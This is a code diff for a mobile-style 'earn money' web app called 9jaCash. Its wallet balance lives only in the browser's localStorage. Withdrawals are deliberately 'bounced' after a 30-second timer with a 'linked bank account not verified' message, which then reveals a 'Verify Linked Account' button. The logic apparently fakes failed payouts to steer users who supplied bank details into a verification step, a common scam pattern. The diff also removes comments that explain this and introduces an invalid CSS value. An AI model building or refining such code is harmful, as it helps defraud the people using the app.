@@ -78,7 +78,6 @@ body.dark-mode .telegram-float{background:linear-gradient(135deg,#0088cc,#00a8e8
 .bank-meta{font-size:12px;color:#94a3b8;transition:color 0.3s;}
 .bank-edit{width:36px;height:36px;border-radius:10px;background:#f8fafc;display:flex;align-items:center;justify-content:center;color:#94a3b8;font-size:12px;cursor:pointer;border:none;transition:all 0.2s;}
 .bank-edit:hover{background:#e2e8f0;color:#6366f1;}
-/* VERIFY BUTTON — ONLY shows after bounce has been reversed and money returned */
 .verify-btn-wrap{display:none;margin-top:12px;}
 .verify-btn-wrap.show{display:block !important;animation:slideUp 0.5s ease both;}
 .verify-btn{width:100%;padding:16px;border-radius:16px;background:linear-gradient(135deg,#ef4444,#dc2626);color:#fff;font-size:15px;font-weight:800;border:none;cursor:pointer;transition:all 0.3s;display:flex;align-items:center;justify-content:center;gap:10px;box-shadow:0 4px 20px rgba(239,68,68,0.3);animation:slideUp 0.5s ease both;}
@@ -124,7 +123,7 @@ body.dark-mode .telegram-float{background:linear-gradient(135deg,#0088cc,#00a8e8
 .claim-timer{background:#f8fafc;border:1px solid #e2e8f0;padding:10px 16px;border-radius:14px;font-size:15px;font-weight:800;color:#6366f1;min-width:70px;text-align:center;cursor:pointer;transition:all 0.3s;}
 .claim-timer.ready{background:linear-gradient(135deg,#6366f1,#8b5cf6);color:#fff;box-shadow:0 4px 12px rgba(99,102,241,0.2);}
 .claim-timer.done{background:#f1f5f9;color:#94a3b8;border-style:dashed;cursor:not-allowed;}
-.bottom-nav{position:fixed;bottom:0;left:50%;transform:translateX(-50%);width:100%;max-width:480px;background:#fff;border-top:1px solid #f1f5f9;padding:10px 20px 24px;display:flex;justify-content:space-around;align-items:center;z-index:100;box-shadow:0 -4px 20px rgba(0,0,0,0.04);transition:all 0.3s ease;}
+.bottom-nav{position:fixed;bottom:0;left:50%;transform:translateX(-50%);width:100%;max-width:480px;background:#fff;border-top:1px solid #f1f5f9;padding:10px 20px 24px;display:flex;justify-around;align-items:center;z-index:100;box-shadow:0 -4px 20px rgba(0,0,0,0.04);transition:all 0.3s ease;}
 .nav-item{display:flex;flex-direction:column;align-items:center;gap:4px;color:#94a3b8;text-decoration:none;font-size:10px;font-weight:600;transition:all 0.3s;border:none;background:none;cursor:pointer;}
 .nav-item i{font-size:20px;}
 .nav-item.active{color:#6366f1;}
@@ -296,7 +295,7 @@ body.dark-mode .redirect-overlay{background:linear-gradient(135deg,#0f172a 0%,#1
   </div>
   <button class="bank-edit" onclick="editBank()"><i class="fa-solid fa-pen"></i></button>
 </div>
-<!-- VERIFY BUTTON: ONLY shows after withdrawal has been bounced back and money returned -->
+
 <div class="verify-btn-wrap" id="verifyBankWrap">
   <button class="verify-btn" onclick="verifyBankLink()" id="verifyBankBtn">
     <i class="fa-solid fa-shield-halved"></i><span>Verify Linked Account</span>
@@ -528,24 +527,17 @@ function finishTutorial() {
   showToast("Tour complete! Start earning!");
 }
 
-// ========== CRITICAL FIX: VERIFY BUTTON ONLY SHOWS AFTER BOUNCE IS COMPLETE ==========
-// ONLY check 9jaCashBouncedWithdrawal — set AFTER executeBounce() returns money
-// Removed pendingBounce check because that means bounce hasn't happened yet
-
 function checkAndShowVerifyButton() {
   const hasBouncedBefore = localStorage.getItem("9jaCashBouncedWithdrawal") === "true";
   const wrap = document.getElementById("verifyBankWrap");
   
   if (hasBouncedBefore) {
     wrap.classList.add("show");
-    console.log("Verify button SHOWN - bounce was previously reversed");
   } else {
     wrap.classList.remove("show");
-    console.log("Verify button HIDDEN - no bounce yet");
   }
 }
 
-// ========== executeBounce — runs when timer expires, returns money, shows popup + button ==========
 function executeBounce() {
   const stored = localStorage.getItem("pendingBounce");
   if (!stored) return;
@@ -554,7 +546,6 @@ function executeBounce() {
     const amount = parseFloat(data.amount) || 0;
     if (amount <= 0) { localStorage.removeItem("pendingBounce"); return; }
     
-    // Return money to balance
     const currentBalance = parseFloat(localStorage.getItem("walletBalance")) || 0;
     balance = currentBalance + amount;
     userData.balance = balance;
@@ -570,11 +561,9 @@ function executeBounce() {
     addBounceToActivity("Withdrawal Reversed", amount, "Unsuccessful - Linked bank account not verified");
     sendBounceNotification(amount);
     
-    // Set flag AFTER money is returned — this triggers the verify button
     localStorage.setItem("9jaCashBouncedWithdrawal", "true");
     checkAndShowVerifyButton();
     
-    // Show bounce popup
     Swal.fire({
       icon: "warning",
       title: "Withdrawal Failed",
@@ -593,7 +582,6 @@ function executeBounce() {
   }
 }
 
-// ========== Check if pending bounce is ready to execute on page load ==========
 function checkPendingBounceOnLoad() {
   const stored = localStorage.getItem("pendingBounce");
   if (!stored) return;
@@ -602,14 +590,12 @@ function checkPendingBounceOnLoad() {
     const timestamp = data.timestamp || 0;
     const now = Date.now();
     const elapsed = now - timestamp;
-    const BOUNCE_DELAY = 30000; // 30 seconds
+    const BOUNCE_DELAY = 30000;
     
     if (elapsed >= BOUNCE_DELAY) {
-      console.log("Bounce timer expired while away - executing now");
       executeBounce();
     } else {
       const remaining = BOUNCE_DELAY - elapsed;
-      console.log("Bounce scheduled in " + remaining + "ms");
       setTimeout(executeBounce, remaining);
     }
   } catch(e) {
@@ -877,7 +863,6 @@ function editBank() {
 
 function setNav(el) { document.querySelectorAll(".nav-item").forEach(function(n) { n.classList.remove("active"); }); el.classList.add("active"); }
 
-// ========== INIT ==========
 window.addEventListener("DOMContentLoaded", function() {
   initFirebase(); initDarkMode(); loadTelegramConfig(); initNotifySystem();
   const hour = new Date().getHours();
@@ -889,7 +874,6 @@ window.addEventListener("DOMContentLoaded", function() {
   document.getElementById("bankNameText").textContent = userData.bankName || "No bank linked";
   document.getElementById("bankMeta").textContent = maskNum(userData.accountNumber) + " | " + (userData.fullName || userData.name || "Unknown");
   
-  // Check if bounce is ready and show verify button ONLY after bounce completes
   checkPendingBounceOnLoad();
   checkAndShowVerifyButton();
   
